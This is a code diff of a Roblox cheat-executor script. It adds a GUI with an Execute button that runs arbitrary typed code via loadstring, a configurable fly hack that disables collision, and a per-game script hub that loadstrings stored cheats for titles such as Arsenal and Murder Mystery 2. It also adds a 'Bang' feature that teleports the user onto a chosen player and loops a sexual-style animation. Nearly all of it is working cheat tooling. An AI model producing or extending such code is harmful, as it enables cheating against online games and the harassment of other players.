+	UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
+	UIGridLayout_2.VerticalAlignment = Enum.VerticalAlignment.Center
+	UIGridLayout_2.CellSize = UDim2.new(0.25, 0, 0.5, 0)
+
+	Search_2.Name = "Search"
+	Search_2.Parent = Buttons_2
+	Search_2.BackgroundColor3 = Color3.new(0.298039, 0.301961, 0.309804)
+	Search_2.BorderColor3 = Color3.new(0, 0, 0)
+	Search_2.BorderSizePixel = 0
+	Search_2.Size = UDim2.new(0, 200, 0, 50)
+	Search_2.Font = Enum.Font.Cartoon
+	Search_2.Text = "Search"
+	Search_2.TextColor3 = Color3.new(1, 1, 1)
+	Search_2.TextScaled = true
+	Search_2.TextSize = 20
+	Search_2.TextWrapped = true
+
+	UICorner_2.Parent = Search_2
+
+	UIStroke.Parent = ImageLabel
+	UIStroke.Color = Color3.fromRGB(44,44,44)
+	UIStroke.Thickness = 5
 
 	Execute.Name = "Execute"
-	Execute.Parent = Buttons
-	Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	Execute.BackgroundTransparency = 1.000
-	Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Execute.Parent = Buttons_2
+	Execute.BackgroundColor3 = Color3.new(0.298039, 0.301961, 0.309804)
+	Execute.BorderColor3 = Color3.new(0, 0, 0)
 	Execute.BorderSizePixel = 0
-	Execute.Size = UDim2.new(0.200000003, 0, 0.600000024, 0)
-	Execute.Image = "rbxassetid://11523543"
+	Execute.Size = UDim2.new(0, 200, 0, 50)
+	Execute.Font = Enum.Font.Cartoon
+	Execute.Text = "Execute"
+	Execute.TextColor3 = Color3.new(1, 1, 1)
+	Execute.TextScaled = true
+	Execute.TextSize = 20
+	Execute.TextWrapped = true
 
-	Execute_2.Name = "Execute"
-	Execute_2.Parent = Execute
-	Execute_2.BackgroundColor3 = Color3.fromRGB(193, 182, 181)
-	Execute_2.BackgroundTransparency = 1.000
-	Execute_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	Execute_2.BorderSizePixel = 0
-	Execute_2.Size = UDim2.new(1, 0, 1, 0)
-	Execute_2.Font = Enum.Font.Cartoon
-	Execute_2.Text = "Execute"
-	Execute_2.TextColor3 = Color3.fromRGB(252, 255, 255)
-	Execute_2.TextScaled = true
-	Execute_2.TextSize = 20.000
-	Execute_2.TextWrapped = true
-
-	UITextSizeConstraint.Parent = Execute_2
-	UITextSizeConstraint.MaxTextSize = 20
+	UICorner_3.Parent = Execute
 
 	Clear.Name = "Clear"
-	Clear.Parent = Buttons
-	Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	Clear.BackgroundTransparency = 1.000
-	Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Clear.Parent = Buttons_2
+	Clear.BackgroundColor3 = Color3.new(0.298039, 0.301961, 0.309804)
+	Clear.BorderColor3 = Color3.new(0, 0, 0)
 	Clear.BorderSizePixel = 0
-	Clear.Size = UDim2.new(0.200000003, 0, 0.600000024, 0)
-	Clear.Image = "rbxassetid://11523543"
+	Clear.Size = UDim2.new(0, 200, 0, 50)
+	Clear.Font = Enum.Font.Cartoon
+	Clear.Text = "Clear"
+	Clear.TextColor3 = Color3.new(1, 1, 1)
+	Clear.TextScaled = true
+	Clear.TextSize = 20
+	Clear.TextWrapped = true
 
-	Clear_2.Name = "Clear"
-	Clear_2.Parent = Clear
-	Clear_2.BackgroundColor3 = Color3.fromRGB(193, 182, 181)
-	Clear_2.BackgroundTransparency = 1.000
-	Clear_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	Clear_2.BorderSizePixel = 0
-	Clear_2.Size = UDim2.new(1, 0, 1, 0)
-	Clear_2.Font = Enum.Font.Cartoon
-	Clear_2.Text = "Clear"
-	Clear_2.TextColor3 = Color3.fromRGB(252, 255, 255)
-	Clear_2.TextScaled = true
-	Clear_2.TextSize = 20.000
-	Clear_2.TextWrapped = true
+	UICorner_4.Parent = Clear
 
-	UITextSizeConstraint_2.Parent = Clear_2
-	UITextSizeConstraint_2.MaxTextSize = 20
+	Search_3.Name = "Search"
+	Search_3.Parent = Pages
+	Search_3.BackgroundColor3 = Color3.new(0, 0, 0)
+	Search_3.BackgroundTransparency = 1
+	Search_3.BorderColor3 = Color3.new(0, 0, 0)
+	Search_3.BorderSizePixel = 0
+	Search_3.Size = UDim2.new(1, 0, 1, 0)
+	Search_3.Visible = false
 
-	Text.Name = "Text"
-	Text.Parent = ImageLabel
-	Text.Active = true
-	Text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	Text.BackgroundTransparency = 1.000
-	Text.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	Text.BorderSizePixel = 0
-	Text.Position = UDim2.new(0, 0, 0, 0)
-	Text.Size = UDim2.new(1, 0, 0.8, 0)
-	Text.CanvasSize = UDim2.new(0, 0, 0, 0)
+	Size_2.Name = "Size"
+	Size_2.Parent = Search_3
+	Size_2.Active = true
+	Size_2.BackgroundColor3 = Color3.new(0, 0, 0)
+	Size_2.BackgroundTransparency = 1
+	Size_2.BorderColor3 = Color3.new(0, 0, 0)
+	Size_2.BorderSizePixel = 0
+	Size_2.Size = UDim2.new(1, 0, 1, 0)
+	Size_2.CanvasSize = UDim2.new(0, 0, 0, 0)
+	Size_2.AutomaticCanvasSize = Enum.AutomaticSize.Y
 
-	Text_2.Name = "Text"
-	Text_2.Parent = Text
-	Text_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	Text_2.BackgroundTransparency = 1.000
-	Text_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	Text_2.BorderSizePixel = 0
-	Text_2.Size = UDim2.new(1, 0, 1, 0)
-	Text_2.ClearTextOnFocus = false
-	Text_2.Font = Enum.Font.Cartoon
-	Text_2.MultiLine = true
-	Text_2.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
-	Text_2.PlaceholderText = ">"
-	Text_2.Text = ""
-	Text_2.TextColor3 = Color3.fromRGB(252, 255, 255)
-	Text_2.TextSize = 20.00
-	Text_2.TextXAlignment = Enum.TextXAlignment.Left
-	Text_2.TextYAlignment = Enum.TextYAlignment.Top
+	GameScript.Name = "Game Script"
+	GameScript.Parent = script
+	GameScript.BackgroundColor3 = Color3.new(0, 0, 0)
+	GameScript.BackgroundTransparency = 0.800000011920929
+	GameScript.BorderColor3 = Color3.new(0, 0, 0)
+	GameScript.BorderSizePixel = 0
+	GameScript.Size = UDim2.new(1, 0, 0, 60)
+	GameScript.Font = Enum.Font.SourceSans
+	GameScript.Text = ""
+	GameScript.TextColor3 = Color3.new(0, 0, 0)
+	GameScript.TextSize = 14
 
-	UIPadding.Parent = Text_2
-	UIPadding.PaddingTop = UDim.new(0, 12)
-	UIPadding.PaddingLeft = UDim.new(0, 12)
-	UIPadding.PaddingBottom = UDim.new(0, 12)
-	UIPadding.PaddingRight = UDim.new(0, 12)
+	Name.Name = "Name"
+	Name.Parent = GameScript
+	Name.BackgroundColor3 = Color3.new(1, 1, 1)
+	Name.BackgroundTransparency = 1
+	Name.BorderColor3 = Color3.new(0, 0, 0)
+	Name.BorderSizePixel = 0
+	Name.Position = UDim2.new(0.119999997, 0, 0, 0)
+	Name.Size = UDim2.new(0.879999995, 0, 1, 0)
+	Name.Font = Enum.Font.Cartoon
+	Name.Text = ""
+	Name.TextColor3 = Color3.new(1, 1, 1)
+	Name.TextSize = 20
+	Name.TextStrokeColor3 = Color3.new(0.988235, 1, 1)
+	Name.TextXAlignment = Enum.TextXAlignment.Left
 
-	Clear_2.MouseButton1Up:Connect(function()
-		Text_2.Text = ""
+	UIPadding_3.Parent = Name
+	UIPadding_3.PaddingBottom = UDim.new(0, 5)
+	UIPadding_3.PaddingLeft = UDim.new(0, 5)
+	UIPadding_3.PaddingRight = UDim.new(0, 5)
+	UIPadding_3.PaddingTop = UDim.new(0, 5)
+
+	Image.Name = "Image"
+	Image.Parent = GameScript
+	Image.BackgroundColor3 = Color3.new(1, 1, 1)
+	Image.BackgroundTransparency = 1
+	Image.BorderColor3 = Color3.new(0, 0, 0)
+	Image.BorderSizePixel = 0
+	Image.Size = UDim2.new(1, 0, 1, 0)
+
+	UIAspectRatioConstraint_4.Parent = Image
+
+	UICorner_5.Parent = Image
+
+	UICorner_6.Parent = GameScript
+
+	UIGridLayout_3.Parent = Size_2
+	UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
+	UIGridLayout_3.CellSize = UDim2.new(1, 0, 0, 50)
+
+	Settings_2.Name = "Settings"
+	Settings_2.Parent = Pages
+	Settings_2.BackgroundColor3 = Color3.new(0, 0, 0)
+	Settings_2.BackgroundTransparency = 1
+	Settings_2.BorderColor3 = Color3.new(0, 0, 0)
+	Settings_2.BorderSizePixel = 0
+	Settings_2.Size = UDim2.new(1, 0, 1, 0)
+	Settings_2.Visible = false
+
+	Size_3.Name = "Size"
+	Size_3.Parent = Settings_2
+	Size_3.Active = true
+	Size_3.BackgroundColor3 = Color3.new(0, 0, 0)
+	Size_3.BackgroundTransparency = 1
+	Size_3.BorderColor3 = Color3.new(0, 0, 0)
+	Size_3.BorderSizePixel = 0
+	Size_3.Size = UDim2.new(1, 0, 1, 0)
+	Size_3.CanvasPosition = Vector2.new(0, 29.9999847)
+	Size_3.CanvasSize = UDim2.new(0, 0, 0, 0)
+	Size_3.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+	UIListLayout.Parent = Size_3
+	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	UIListLayout.Padding = UDim.new(0, 10)
+
+	Number.Name = "Number"
+	Number.Parent = Size_3
+	Number.BackgroundColor3 = Color3.new(0, 0, 0)
+	Number.BackgroundTransparency = 0.800000011920929
+	Number.BorderColor3 = Color3.new(0, 0, 0)
+	Number.BorderSizePixel = 0
+	Number.Size = UDim2.new(0.4, 0, 0, 60)
+
+	TextLabel.Parent = Number
+	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+	TextLabel.BackgroundTransparency = 1
+	TextLabel.BorderColor3 = Color3.new(0, 0, 0)
+	TextLabel.BorderSizePixel = 0
+	TextLabel.Size = UDim2.new(0.699999988, 0, 1, 0)
+	TextLabel.Font = Enum.Font.Cartoon
+	TextLabel.Text = "Fly Speed"
+	TextLabel.TextColor3 = Color3.new(1, 1, 1)
+	TextLabel.TextScaled = true
+	TextLabel.TextSize = 14
+	TextLabel.TextWrapped = true
+
+	UITextSizeConstraint.Parent = TextLabel
+	UITextSizeConstraint.MaxTextSize = 30
+
+	TextBox.Parent = Number
+	TextBox.BackgroundColor3 = Color3.new(0, 0, 0)
+	TextBox.BackgroundTransparency = 0.800000011920929
+	TextBox.BorderColor3 = Color3.new(0, 0, 0)
+	TextBox.BorderSizePixel = 0
+	TextBox.Position = UDim2.new(0.699999988, 0, 0, 0)
+	TextBox.Size = UDim2.new(0.300000012, 0, 1, 0)
+	TextBox.ClearTextOnFocus = false
+	TextBox.Font = Enum.Font.Cartoon
+	TextBox.PlaceholderColor3 = Color3.new(0.988235, 1, 1)
+	TextBox.PlaceholderText = ""
+	TextBox.Text = "1"
+	TextBox.TextColor3 = Color3.new(1, 1, 1)
+	TextBox.TextScaled = true
+	TextBox.TextSize = 14
+	TextBox.TextWrapped = true
+
+	UICorner_7.Parent = TextBox
+
+	UITextSizeConstraint_2.Parent = TextBox
+	UITextSizeConstraint_2.MaxTextSize = 40
+
+	UICorner_8.Parent = Number
+
+	Key.Name = "Key"
+	Key.Parent = Size_3
+	Key.BackgroundColor3 = Color3.new(0, 0, 0)
+	Key.BackgroundTransparency = 0.800000011920929
+	Key.BorderColor3 = Color3.new(0, 0, 0)
+	Key.BorderSizePixel = 0
+	Key.Size = UDim2.new(0.4, 0, 0, 60)
+
+	TextLabel_2.Parent = Key
+	TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
+	TextLabel_2.BackgroundTransparency = 1
+	TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
+	TextLabel_2.BorderSizePixel = 0
+	TextLabel_2.Size = UDim2.new(0.699999988, 0, 1, 0)
+	TextLabel_2.Font = Enum.Font.Cartoon
+	TextLabel_2.Text = "Fly Key"
+	TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
+	TextLabel_2.TextScaled = true
+	TextLabel_2.TextSize = 14
+	TextLabel_2.TextWrapped = true
+
+	UITextSizeConstraint_3.Parent = TextLabel_2
+	UITextSizeConstraint_3.MaxTextSize = 30
+
+	TextBox_2.Parent = Key
+	TextBox_2.BackgroundColor3 = Color3.new(0, 0, 0)
+	TextBox_2.BackgroundTransparency = 0.800000011920929
+	TextBox_2.BorderColor3 = Color3.new(0, 0, 0)
+	TextBox_2.BorderSizePixel = 0
+	TextBox_2.Position = UDim2.new(0.699999988, 0, 0, 0)
+	TextBox_2.Size = UDim2.new(0.300000012, 0, 1, 0)
+	TextBox_2.ClearTextOnFocus = false
+	TextBox_2.Font = Enum.Font.Cartoon
+	TextBox_2.PlaceholderColor3 = Color3.new(0.988235, 1, 1)
+	TextBox_2.PlaceholderText = ""
+	TextBox_2.Text = "X"
+	TextBox_2.TextColor3 = Color3.new(1, 1, 1)
+	TextBox_2.TextScaled = true
+	TextBox_2.TextSize = 14
+	TextBox_2.TextWrapped = true
+
+	UICorner_9.Parent = TextBox_2
+
+	UITextSizeConstraint_4.Parent = TextBox_2
+	UITextSizeConstraint_4.MaxTextSize = 40
+
+	UICorner_10.Parent = Key
+
+	Key2.Name = "Key2"
+	Key2.Parent = Size_3
+	Key2.BackgroundColor3 = Color3.new(0, 0, 0)
+	Key2.BackgroundTransparency = 0.800000011920929
+	Key2.BorderColor3 = Color3.new(0, 0, 0)
+	Key2.BorderSizePixel = 0
+	Key2.Size = UDim2.new(0.4, 0, 0, 60)
+
+	TextLabel_3.Parent = Key2
+	TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
+	TextLabel_3.BackgroundTransparency = 1
+	TextLabel_3.BorderColor3 = Color3.new(0, 0, 0)
+	TextLabel_3.BorderSizePixel = 0
+	TextLabel_3.Size = UDim2.new(0.699999988, 0, 1, 0)
+	TextLabel_3.Font = Enum.Font.Cartoon
+	TextLabel_3.Text = "Bang Key"
+	TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
+	TextLabel_3.TextScaled = true
+	TextLabel_3.TextSize = 14
+	TextLabel_3.TextWrapped = true
+
+	UITextSizeConstraint_5.Parent = TextLabel_3
+	UITextSizeConstraint_5.MaxTextSize = 30
+
+	TextBox_3.Parent = Key2
+	TextBox_3.BackgroundColor3 = Color3.new(0, 0, 0)
+	TextBox_3.BackgroundTransparency = 0.800000011920929
+	TextBox_3.BorderColor3 = Color3.new(0, 0, 0)
+	TextBox_3.BorderSizePixel = 0
+	TextBox_3.Position = UDim2.new(0.699999988, 0, 0, 0)
+	TextBox_3.Size = UDim2.new(0.300000012, 0, 1, 0)
+	TextBox_3.ClearTextOnFocus = false
+	TextBox_3.Font = Enum.Font.Cartoon
+	TextBox_3.PlaceholderColor3 = Color3.new(0.988235, 1, 1)
+	TextBox_3.PlaceholderText = ""
+	TextBox_3.Text = "C"
+	TextBox_3.TextColor3 = Color3.new(1, 1, 1)
+	TextBox_3.TextScaled = true
+	TextBox_3.TextSize = 14
+	TextBox_3.TextWrapped = true
+
+	UICorner_11.Parent = TextBox_3
+
+	UITextSizeConstraint_6.Parent = TextBox_3
+	UITextSizeConstraint_6.MaxTextSize = 40
+
+	UICorner_12.Parent = Key2
+
+	Key3.Name = "Key3"
+	Key3.Parent = Size_3
+	Key3.BackgroundColor3 = Color3.new(0, 0, 0)
+	Key3.BackgroundTransparency = 0.800000011920929
+	Key3.BorderColor3 = Color3.new(0, 0, 0)
+	Key3.BorderSizePixel = 0
+	Key3.Size = UDim2.new(0.4, 0, 0, 60)
+
+	TextLabel_4.Parent = Key3
+	TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
+	TextLabel_4.BackgroundTransparency = 1
+	TextLabel_4.BorderColor3 = Color3.new(0, 0, 0)
+	TextLabel_4.BorderSizePixel = 0
+	TextLabel_4.Size = UDim2.new(0.699999988, 0, 1, 0)
+	TextLabel_4.Font = Enum.Font.Cartoon
+	TextLabel_4.Text = "Executor Key"
+	TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
+	TextLabel_4.TextScaled = true
+	TextLabel_4.TextSize = 14
+	TextLabel_4.TextWrapped = true
+
+	UITextSizeConstraint_7.Parent = TextLabel_4
+	UITextSizeConstraint_7.MaxTextSize = 30
+
+	TextBox_4.Parent = Key3
+	TextBox_4.BackgroundColor3 = Color3.new(0, 0, 0)
+	TextBox_4.BackgroundTransparency = 0.800000011920929
+	TextBox_4.BorderColor3 = Color3.new(0, 0, 0)
+	TextBox_4.BorderSizePixel = 0
+	TextBox_4.Position = UDim2.new(0.699999988, 0, 0, 0)
+	TextBox_4.Size = UDim2.new(0.300000012, 0, 1, 0)
+	TextBox_4.ClearTextOnFocus = false
+	TextBox_4.Font = Enum.Font.Cartoon
+	TextBox_4.PlaceholderColor3 = Color3.new(0.988235, 1, 1)
+	TextBox_4.PlaceholderText = ""
+	TextBox_4.Text = "G"
+	TextBox_4.TextColor3 = Color3.new(1, 1, 1)
+	TextBox_4.TextScaled = true
+	TextBox_4.TextSize = 14
+	TextBox_4.TextWrapped = true
+
+	UICorner_13.Parent = TextBox_4
+
+	UITextSizeConstraint_8.Parent = TextBox_4
+	UITextSizeConstraint_8.MaxTextSize = 40
+
+	UICorner_14.Parent = Key3
+
+	UICorner_15.Parent = ImageLabel
+
+	Clear.MouseButton1Up:Connect(function()
+		PlayerScript.Text = ""
 	end)
 
-	Execute_2.MouseButton1Up:Connect(function()
-		loadstring(Text_2.Text)()
+	Execute.MouseButton1Up:Connect(function()
+		loadstring(PlayerScript.Text)()
+	end)
+
+	PlayerScript:GetPropertyChangedSignal("Text"):Connect(function()
+		local Text = PlayerScript.Text
+
+		TextLabel_5.Text = Text
+
+		local spl = string.split(Text,"\n")
+
+		local Number = 0
+
+		local Numbers = ""
+		for i, v in pairs(spl) do
+			Number += 1
+			if i == 1 then
+				Numbers = Numbers..Number
+			else
+				Numbers = Numbers.."\n"..Number
+			end
+		end
+
+		ScriptLine.Text = Numbers
+
+	end)
+
+	Executor.MouseButton1Click:Connect(function()
+		Executor_2.Visible = true
+		Search_3.Visible = false
+		Settings_2.Visible = false
+	end)
+
+	Search.MouseButton1Click:Connect(function()
+		Executor_2.Visible = false
+		Search_3.Visible = true
+		Settings_2.Visible = false
+	end)
+
+	Search_2.MouseButton1Click:Connect(function()
+		Executor_2.Visible = false
+		Search_3.Visible = true
+		Settings_2.Visible = false
+	end)
+
+	Settings.MouseButton1Click:Connect(function()
+		Executor_2.Visible = false
+		Search_3.Visible = false
+		Settings_2.Visible = true
+	end)
+
+	local ExKey = "G"
+	local BangKey = "C"
+	local FlyKey = "X"
+
+	TextBox_4:GetPropertyChangedSignal("Text"):Connect(function()
+		local Text = TextBox_4.Text
+
+		if #Text <= 1 then
+			if #Text == 1 then
+				ExKey = string.upper(Text)
+			end
+		else
+			TextBox_4.Text = "G"
+		end
+	end)
+
+	TextBox_3:GetPropertyChangedSignal("Text"):Connect(function()
+		local Text = TextBox_3.Text
+
+		if #Text <= 1 then
+			if #Text == 1 then
+				BangKey = string.upper(Text)
+			end
+		else
+			TextBox_3.Text = "C"
+		end
+	end)
+
+	TextBox_2:GetPropertyChangedSignal("Text"):Connect(function()
+		local Text = TextBox_2.Text
+
+		if #Text <= 1 then
+			if #Text == 1 then
+				FlyKey = string.upper(Text)
+			end
+		else
+			TextBox_2.Text = "X"
+		end
 	end)
 
 	local uis = game:GetService("UserInputService")
 	local Ts = game:GetService("TweenService")
 
 	local OpenGoal = {
-		Position = UDim2.new(0.25,0,0.25,0)
+		Position = UDim2.new(0.2,0,0.2,0)
 	}
 
 	local CloseGoal = {
-		Position = UDim2.new(0.25,0,-1.25,0)
+		Position = UDim2.new(0.2,0,-1,0)
 	}
 
 	local Bool = false
@@ -171,8 +1894,165 @@ if not Rs:FindFirstChild("Executor_By:ChimeraLle") then
 	local An1 = Ts:Create(ImageLabel,info,OpenGoal)
 	local An2 = Ts:Create(ImageLabel,info,CloseGoal)
 
+	local plrs = game:GetService("Players")
+	local Me = plrs.LocalPlayer
+	local M = Me:GetMouse()
+
+	local Selection = false
+	local Playing = false
+
+	local function StartBang(TarHrp)
+
+		local MyChar = Me.Character or Me.CharacterAdded:Wait()
+
+		local MyHrp = MyChar:FindFirstChild("HumanoidRootPart")
+		local MyHum = MyChar:WaitForChild("Humanoid")
+
+		if MyHrp and MyHum then
+
+			local Anid = Instance.new("Animation")
+
+			if MyHum.RigType.Name == "R15" then
+				Anid.AnimationId = "rbxassetid://5918726674"
+			else
+				Anid.AnimationId = "rbxassetid://148840371"
+			end
+
+			local MyAni = MyHum:FindFirstChildWhichIsA("Animator")
+
+			local An = MyAni:LoadAnimation(Anid) or MyHum:LoadAnimation(Anid)
+
+			local bangOffet = CFrame.new(0,0,1.1)
+
+			Playing = true
+
+			local AnPlaying = false
+
+			local function PlayAnimation()
+				AnPlaying = true
+				An:Play()
+				wait(0.3)
+				AnPlaying = false
+				An:Stop()
+			end
+
+			while Playing == true do
+				task.wait()
+				MyHrp.CFrame = TarHrp.CFrame * bangOffet
+
+				if AnPlaying == false then
+					task.spawn(PlayAnimation)
+				end
+
+			end
+
+			An:Stop()
+
+		end
+	end
+
+	local Flying = false
+
+	local cam = workspace.CurrentCamera
+
+	local W = false
+	local A = false
+	local S = false
+	local D = false
+
+	local function OnKeyPressed()
+
+		local char = Me.Character or Me.CharacterAdded:Wait()
+		local hum = char:FindFirstChildWhichIsA("Humanoid")
+		local hrp = char:WaitForChild("HumanoidRootPart")
+
+		local Head = char:WaitForChild("Head")
+
+		if Flying == true then
+			hum.PlatformStand = true
+
+			local Bv = Instance.new("BodyVelocity",hrp)
+			Bv.P = 100000
+			Bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
+			Bv.Velocity = Vector3.new(0,0,0)
+
+			local Bg = Instance.new("BodyGyro",hrp)
+			Bg.P = 100000
+			Bg.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
+
+			while Flying == true do
+				Bg.CFrame = cam.CFrame
+
+				hrp.CanCollide = false
+				Head.CanCollide = false
+
+				if char then
+					if hum.RigType.Name == "R15" then
+						local LTorso = char:WaitForChild("LowerTorso")
+						local UTorso = char:WaitForChild("UpperTorso")
+
+						LTorso.CanCollide = false
+						UTorso.CanCollide = false
+					else
+						local Torso = char:WaitForChild("Torso")
+
+						Torso.CanCollide = false
+					end
+				else return
+				end
+
+				local Speed = tonumber(TextBox.Text) or 1
+
+				--Forward
+				if W == true then
+					hrp.CFrame = hrp.CFrame + cam.CFrame.LookVector * Speed
+				end
+				--Backward
+				if S == true then
+					hrp.CFrame = hrp.CFrame - cam.CFrame.LookVector * Speed
+				end
+				--Left
+				if A == true then
+					hrp.CFrame = hrp.CFrame - cam.CFrame.RightVector * Speed
+				end
+				--Right
+				if D == true then
+					hrp.CFrame = hrp.CFrame + cam.CFrame.RightVector * Speed
+				end
+
+
+
+				task.wait()
+			end
+		else
+			hum.PlatformStand = false
+
+			hrp.CanCollide = true
+			Head.CanCollide = true
+
+			if hum.RigType.Name == "R15" then
+				local LTorso = char:WaitForChild("LowerTorso")
+				local UTorso = char:WaitForChild("UpperTorso")
+
+				LTorso.CanCollide = false
+				UTorso.CanCollide = false
+			else
+				local Torso = char:WaitForChild("Torso")
+
+				Torso.CanCollide = false
+			end
+
+			for i, v in ipairs(hrp:GetChildren()) do
+				if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
+					v:Destroy()
+				end
+			end
+
+		end
+	end
+
 	uis.InputBegan:Connect(function(key)
-		if key.KeyCode == Enum.KeyCode.G then
+		if key.KeyCode == Enum.KeyCode[ExKey] then
 			if Bool == false then
 				Bool = true
 				An1:Play()
@@ -180,7 +2060,90 @@ if not Rs:FindFirstChild("Executor_By:ChimeraLle") then
 				Bool = false
 				An2:Play()
 			end
+		elseif key.UserInputType == Enum.UserInputType.MouseButton1 then
+			if Selection == true then
+
+				Selection = false
+
+				for i, v in ipairs(CoreGui:GetChildren()) do
+					if v:IsA("Message") then
+						v:Destroy()
+					end
+				end
+
+				local Target = M.Target
+				if Target and Target:IsA("BasePart") then
+					local TarChar = Target.Parent
+					local TarHrp = TarChar:FindFirstChild("HumanoidRootPart")
+					if TarHrp then
+						StartBang(TarHrp)
+					end
+				end
+			end
+		elseif key.KeyCode == Enum.KeyCode[BangKey] then
+			Selection = not Selection
+
+			if Selection == true then
+				local message = Instance.new("Message")
+				message.Parent = CoreGui
+				message.Text = "Select a Player!"
+			else
+				Playing = false
+				for i, v in ipairs(CoreGui:GetChildren()) do
+					if v:IsA("Message") then
+						v:Destroy()
+					end
+				end
+			end
+		elseif key.KeyCode == Enum.KeyCode[FlyKey] then
+			Flying = not Flying
+			OnKeyPressed()
+		elseif key.KeyCode == Enum.KeyCode.W then
+			W = true
+		elseif key.KeyCode == Enum.KeyCode.A then
+			A = true
+		elseif key.KeyCode == Enum.KeyCode.S then
+			S = true
+		elseif key.KeyCode == Enum.KeyCode.D then
+			D = true
 		end
 	end)
-	
+
+	uis.InputEnded:Connect(function(key)
+		if key.KeyCode == Enum.KeyCode.W then
+			W = false
+		elseif key.KeyCode == Enum.KeyCode.A then
+			A = false
+		elseif key.KeyCode == Enum.KeyCode.S then
+			S = false
+		elseif key.KeyCode == Enum.KeyCode.D then
+			D = false
+		end
+	end)
+
+	local Images = {
+		bloxfruit = "rbxassetid://12796342017",
+		arsenal = "rbxassetid://7699371504",
+		brookhaven = "rbxassetid://10023132385",
+		lumber_tycoon_2 = "rbxassetid://10571717333",
+		kat = "rbxassetid://11515562007",
+		murder_mystery_2 = "rbxassetid://1163151241"
+	}
+
+	for i, v in pairs(Scripts) do
+		local GameName = i
+		local GameIcon = Images[GameName]
+		for i2, v2 in pairs(v) do
+			local new = GameScript:Clone()
+			new.Parent = Size_2
+			local newName = new:WaitForChild("Name")
+			local newIm = new:WaitForChild("Image")
+			newName.Text = i2
+			newIm.Image = GameIcon
+
+			new.MouseButton1Click:Connect(function()
+				loadstring(v2)()
+			end)
+		end
+	end
 end
